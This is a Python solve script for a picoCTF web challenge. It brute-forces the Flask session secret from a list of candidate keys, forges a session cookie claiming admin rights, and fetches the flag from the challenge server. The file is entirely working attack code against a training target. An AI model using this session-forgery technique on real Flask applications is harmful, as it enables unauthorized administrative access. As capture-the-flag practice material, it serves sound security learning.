import manageFlaskSession
import requests
import re

from unittest.mock import patch, mock_open
with patch("builtins.open", mock_open(read_data="dummy_flag")):
    import server
#####################CHANGE THE PORT (52134) TO YOU PORT ################
res = requests.post("http://mercury.picoctf.net:52134/search", data={"name": "snickerdoodle"})
server_cookie = res.cookies["session"]

print(f"Server cookie: {server_cookie}")

for cookie in server.cookie_names:
    try:
        out = manageFlaskSession.decodeFlaskCookie(cookie, server_cookie)
        print(f"Found correct key: {cookie}, contents = {out}")
        new_cookie = manageFlaskSession.encodeFlaskCookie(cookie, {u'very_auth': 'admin'})
        print(f"New cookie: {new_cookie}")
        #####################CHANGE THE PORT (52134) TO YOU PORT ################
        res = requests.get("http://mercury.picoctf.net:52134/display", cookies={"session": new_cookie})
        if match := re.search(r"picoCTF{[^}]+}", res.text):
            print (f"The flag: {match.group(0)}")
        break
    except Exception:
        pass
